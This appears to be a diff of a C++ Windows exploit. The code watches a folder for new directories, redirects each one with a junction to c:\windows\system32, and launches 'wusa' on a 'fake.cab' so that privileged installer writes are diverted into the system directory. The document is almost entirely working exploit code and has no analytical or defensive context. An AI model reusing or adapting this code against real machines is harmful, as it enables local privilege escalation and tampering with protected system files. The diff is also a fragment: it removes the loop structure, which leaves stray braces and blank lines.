@@ -23,12 +23,11 @@ void WatchDirectory()
 	FILE_NOTIFY_INFORMATION strFileNotifyInfo[1024];
 	DWORD dwBytesReturned = 0;
 
-	while (TRUE)
-	{
+
 
 
 		ReadDirectoryChangesW(hDir, (LPVOID)&strFileNotifyInfo, sizeof(strFileNotifyInfo), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &dwBytesReturned, NULL, NULL);
-		wcout << _T("File Modified: ") << strFileNotifyInfo[0].FileName << endl;
+		wcout << _T("Folder Created: ") << strFileNotifyInfo[0].FileName << endl;
 		filename1 = strFileNotifyInfo[0].FileName;
 
 		std::wstring df = std::wstring(root) + filename1;
@@ -38,13 +37,13 @@ void WatchDirectory()
 			FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
 				nullptr);
 		ReparsePoint::CreateMountPoint(hJunction, L"c:\\windows\\system32", L"");
-		break;
-	}
+
+	
 }
 
 DWORD WINAPI Thread1(LPVOID lpParam)
 {
-	BOOL errorflag = false;
+
 	Sleep(100);
 	WinExec("\"c:\\windows\\system32\\cmd.exe\" /k wusa c:\\users\\%username%\\downloads\\fake.cab", 5);
 	return 0;
